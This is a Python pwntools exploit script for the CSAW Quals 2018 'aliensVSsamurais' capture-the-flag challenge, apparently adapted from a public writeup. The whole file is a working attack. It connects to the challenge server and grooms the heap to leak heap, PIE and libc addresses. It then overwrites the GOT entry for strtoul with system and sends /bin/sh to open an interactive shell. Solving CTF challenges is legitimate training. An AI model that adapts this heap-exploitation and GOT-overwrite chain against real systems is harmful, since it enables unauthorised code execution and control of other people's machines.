# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/CSAWQuals/2018/alien_invasion

from pwn import *

# Establish the target prcoess, and elfs
#target = process('./aliensVSsamurais', env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)
targetElf = ELF('aliensVSsamurais')
libcfile = ELF('libc-2.23.so')
target = remote('pwn.chal.csaw.io', 9004)

# Establish functions to interact with code
def addSamurai(name):
        print target.recvuntil("Daimyo, nani o shitaidesu ka?\n")
        target.sendline('1')
        print target.recvuntil("hmph\nWhat is my weapon's name?\n")
        target.sendline(name)


def remSamurai(i):
        print target.recvuntil("Daimyo, nani o shitaidesu ka?\n")
        target.sendline('2')
        target.sendline(str(i)) 

def goHorde():
    target.sendline("3")

# We have two options with this function, one to rename the memory with what was there so we don't cause any changes that screw us over, and another which doesn't
# send data to overwrite it, which is used when we write system over the got entry for strtoul
def renameAlien(offset, libc=0):
        print target.recvuntil("Brood mother, what tasks do we have today.")
        target.sendline("3")
        print target.recvuntil("Brood mother, which one of my babies would you like to rename?")
        target.sendline(str(offset))
        print target.recvuntil('Oh great what would you like to rename ')
        leak = target.recvline()
        leak = leak.replace(" to?\n", "")
        leak = u64(leak + "\x00"*(8 - len(leak)))
        if libc != 1:
            target.send(p64(leak))
        return leak


def makeAlien(len, name):
        print target.recvuntil("Brood mother, what tasks do we have today.")
        target.sendline("1")
        print target.recvuntil("How long is my name?\n")
        target.sendline(str(len))
        print target.recvuntil("What is my name?")
        target.sendline(name)

def remAlien(i):
        print target.recvuntil("Brood mother, what tasks do we have today.")
        target.sendline("2")
        print target.recvuntil("Which alien is unsatisfactory, brood mother?")
        target.sendline(str(i))

# Add the three samurais used for the PIE infoleak 
addSamurai("15935728")
addSamurai("75395128")
addSamurai("95135728")

# Exit the samurai mode, go over to the horde
goHorde()

# Go through the process of heap consolidation to get a heap infoleak. Check the writeup for details

makeAlien(16, "0"*14 + "\n")
makeAlien(248, "1"*246 + "\n")
makeAlien(248, "2"*246 + "\n")


remAlien(0)


makeAlien(248, "3"*346 + '\n')


makeAlien(16, "4"*13 + "\n")


remAlien(2)


makeAlien(248, "5"*240 + p64(544))


remAlien(1)


remAlien(3)


makeAlien(248, "6"*16 + '\n')


# Leak the heap address, and calculate the base of the heap
heapleak = renameAlien(5)
heapBase = heapleak - 0x1820
log.info("heap base: " + hex(heapBase))

# Get the PIE infoleak

remAlien(6)

makeAlien(280, '7'*256 + p64(heapBase + 0x1450) + '\n')

pieleak = renameAlien(5)
pieBase = pieleak - 0x202708
log.info("PIE base: " + hex(pieBase))

# Get the libc infoleak

remAlien(7)

makeAlien(280, '8'*256 + p64(pieBase + 0x202058) + '\n')

strtoul_addr = renameAlien(5, 1)
libc_base = strtoul_addr - libcfile.symbols['strtoul']
log.info("libc base: " + hex(libc_base))

# Write over the got address of strtoul with system

system = libc_base + libcfile.symbols['system']
target.send(p64(system))

# Send /bin/sh which will get passed to strtoul, which due to the got write is really system

target.sendline('/bin/sh')

# Enjoy the shell

target.interactive()